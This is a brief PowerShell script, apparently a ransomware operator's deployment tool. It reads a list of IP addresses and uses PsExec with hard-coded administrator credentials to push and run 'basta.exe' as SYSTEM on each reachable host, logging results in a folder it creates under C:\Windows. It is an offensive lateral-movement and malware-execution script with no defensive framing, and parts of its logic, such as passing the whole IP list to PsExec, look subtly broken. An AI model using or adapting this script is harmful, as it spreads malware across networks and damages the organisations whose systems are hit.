# Creates the Temp1 folder and two log files
if ((Test-Path -Path C:\Windows\Temp1) -eq $false)
{
  New-Item -Path C:\Windows -Name Temp1 -ItemType Directory;
  New-Item -Path C:\Windows\Temp1 -Name log.info -ItemType File;
  New-Item -Path C:\Windows\Temp1 -Name log.dat -ItemType File;
}


# For each ip, connect via PsExec using specified username/password and run basta.exe

$ips = get-content C:\Windows\ip_list.txt -Raw
foreach($ip in $ips){
  if(Test-NetConnection $ip) {
  & C:\Users\Public\PsExec.exe -accepteula -d -s -n 5 @ips -c C:\Users\Public\basta.exe -u administrator -p password123;
  echo $ip >> C:\Windows\Temp1\log.info;
  }
  else{
  echo $ip >> C:\Windows\Temp1\log.dat;
  }
}